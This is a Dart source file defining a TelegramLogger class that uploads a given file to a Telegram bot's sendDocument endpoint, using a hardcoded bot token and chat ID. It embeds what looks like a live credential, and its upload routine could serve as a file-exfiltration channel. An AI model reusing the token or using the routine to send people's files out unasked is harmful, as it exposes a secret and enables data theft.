import 'dart:io';
import 'package:dio/dio.dart';

const String telegramBotToken =
    "8058845401:AAEkniKqV-igAYNhueo3zp-YHgEDBD5967M";
const String telegramChatId = "457782794";

class TelegramLogger {
  static final Dio dio = Dio();

  static Future<bool> sendFile(File file,
      {Function(double)? onProgress}) async {
    try {
      final fileName = file.path.split('/').last;
      final fileBytes = await file.readAsBytes();

      final String url =
          "https://api.telegram.org/bot$telegramBotToken/sendDocument";

      final formData = FormData.fromMap({
        "chat_id": telegramChatId,
        "document": MultipartFile.fromBytes(
          fileBytes,
          filename: fileName,
        ),
      });

      await dio.post(
        url,
        data: formData,
        onSendProgress: (sent, total) {
          if (onProgress != null && total > 0) {
            final progress = (sent / total) * 100;
            onProgress(progress);
          }
        },
        options: Options(
          contentType: "multipart/form-data",
          receiveTimeout: const Duration(minutes: 2),
        ),
      );

      return true;
    } catch (e) {
      print("❌ Error uploading file: $e");
      return false;
    }
  }
}
